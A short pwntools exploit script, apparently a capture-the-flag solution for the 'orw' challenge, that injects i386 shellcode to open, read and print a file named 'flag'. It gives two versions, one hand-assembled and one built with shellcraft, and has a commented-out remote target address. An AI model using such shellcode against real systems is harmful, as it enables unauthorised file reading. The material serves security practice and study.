from pwn import *

context(log_level='debug', arch='i386', os='linux')
p = process('orw')
# p = remote("110.42.133.120","10010")
elf = ELF('orw')


# 1
def pwn1():
    p.recvuntil(':')
    shellcode = b""
    shellcode += asm('xor ecx,ecx;mov eax,0x5; push ecx;push 0x67616c66 ; mov ebx,esp;xor edx,edx;int 0x80;')
    shellcode += asm('mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov dl,0x30;int 0x80;')
    shellcode += asm('mov eax,0x4;mov bl,0x1;mov edx,0x30;int 0x80;')
    p.sendline(shellcode)
    flag = p.recv(100)
    print(flag)


# 2
def pwn2():
    p.recvuntil(':')
    # /flag -> flag
    shellcode = shellcraft.open('flag')
    shellcode += shellcraft.read('eax', 'esp', 100)
    shellcode += shellcraft.write(1, 'esp', 200)
    shellcode = asm(shellcode)
    p.sendline(shellcode)
    flag = (p.recv(100))
    print(flag)


pwn2()
p.interactive()
